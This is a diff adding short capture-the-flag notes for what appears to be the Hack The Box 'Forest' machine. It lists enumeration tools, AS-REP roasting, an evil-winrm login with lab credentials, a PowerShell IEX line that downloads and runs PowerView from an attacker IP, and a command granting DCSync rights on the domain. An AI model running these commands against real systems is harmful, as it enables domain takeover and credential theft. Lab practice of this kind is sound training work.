@@ -1,0 +1,9 @@
+nmap --->>
+enum4linux --->> get usernames
+impacket/GetNPUsers.py --->> find creds
+login with evil-rm --->> user.txt : ruby evil-winrm.rb -i 10.10.10.161 -u svc-alfresco -p s3rvice
+priv esc : ippsec
+	IEX(New-Object Net.WebClient).downloadString('http://10.10.17.152/PowerView.ps1')
+	$pass = convertto-securestring 'PleaseSub' -AsPlainText -Force
+	$cred = New-Object System.Management.Automation.PSCredential('HTB\pwner', $pass)
+	Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity pwner -Rights DCSync
